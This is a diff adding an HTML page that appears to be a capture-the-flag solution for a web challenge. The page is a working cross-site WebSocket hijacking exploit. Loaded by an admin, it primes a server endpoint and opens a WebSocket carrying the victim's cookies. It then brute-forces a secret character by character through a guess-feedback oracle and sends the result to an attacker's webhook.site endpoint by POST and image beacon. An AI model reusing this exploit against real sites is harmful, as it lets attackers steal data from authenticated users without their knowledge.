@@ -1,0 +1,99 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>admin-check</title>
+<body>
+  <h3>Loading…</h3>
+  <pre id="log"></pre>
+  <script>
+    // === CONFIG ===
+    const CHALLENGE = "https://YOUR-CHALLENGE-HOST";   // e.g., https://photo-archiver.ecsc25.hack.cert.pl
+    const EXFIL_URL = "https://webhook.site/YOUR-ID";  // any endpoint you control
+
+    // === Helpers ===
+    const log = (...a) => (document.getElementById("log").textContent += a.join(" ") + "\n");
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+    const wsURL = CHALLENGE.replace(/^http/i, "ws") + "/ws"; // http->ws, https->wss
+
+    // Send a GET to /refresh to force the server to set answer=flag when admin has a flag cookie
+    function primeAnswer() {
+      // Image beacon avoids CORS; cache-bust with random qparam
+      new Image().src = CHALLENGE + "/refresh?" + Math.random();
+    }
+
+    // Open WebSocket (cookies for CHALLENGE are auto-attached by the admin's browser)
+    function openWS() {
+      return new Promise((resolve, reject) => {
+        const ws = new WebSocket(wsURL);
+        ws.addEventListener("open", () => resolve(ws));
+        ws.addEventListener("error", reject);
+        ws.addEventListener("close", () => {/* ignore */});
+      });
+    }
+
+    // Ask the /ws oracle by sending a guess; returns array of "green"/"yellow"/"red"
+    function ask(ws, guess) {
+      return new Promise((resolve, reject) => {
+        const onMsg = (evt) => {
+          try {
+            ws.removeEventListener("message", onMsg);
+            resolve(JSON.parse(evt.data));
+          } catch (e) { reject(e); }
+        };
+        ws.addEventListener("message", onMsg);
+        ws.send(JSON.stringify({ answer: guess }));
+      });
+    }
+
+    async function main() {
+      try {
+        log("[*] Priming /refresh …");
+        primeAnswer();
+        await sleep(400); // tiny delay
+
+        log("[*] Connecting WebSocket:", wsURL);
+        const ws = await openWS();
+
+        // 1) Determine length: send an overlong guess; response length == true length
+        const probe = await ask(ws, "a".repeat(256));
+        const L = probe.length;
+        log("[+] Length =", L);
+
+        // 2) Find a padding character not present in the flag (all cells 'red' when repeated)
+        const printable = [];
+        for (let c = 32; c <= 126; c++) printable.push(String.fromCharCode(c));
+
+        let PAD = null;
+        for (const ch of printable) {
+          const res = await ask(ws, ch.repeat(L));
+          if (res.every(x => x === "red")) { PAD = ch; break; }
+        }
+        if (!PAD) PAD = "#";
+        log("[+] Pad char =", JSON.stringify(PAD));
+
+        // 3) Recover each position using 'green' as success
+        const answer = Array(L).fill(PAD);
+        for (let i = 0; i < L; i++) {
+          for (const ch of printable) {
+            answer[i] = ch;
+            const res = await ask(ws, answer.join(""));
+            if (res[i] === "green") {
+              log(`[+] pos ${i}:`, JSON.stringify(ch));
+              break;
+            }
+          }
+        }
+        const flag = answer.join("");
+        log("[+] FLAG =", flag);
+
+        // 4) Exfiltrate (two channels: POST + GET beacon)
+        fetch(EXFIL_URL, { method: "POST", mode: "no-cors", headers: {"Content-Type":"text/plain"}, body: flag })
+          .catch(()=>{});
+        new Image().src = EXFIL_URL + "?flag=" + encodeURIComponent(flag) + "&t=" + Date.now();
+
+      } catch (e) {
+        log("[!] Error:", e && (e.stack || e));
+      }
+    }
+    main();
+  </script>
+</body>
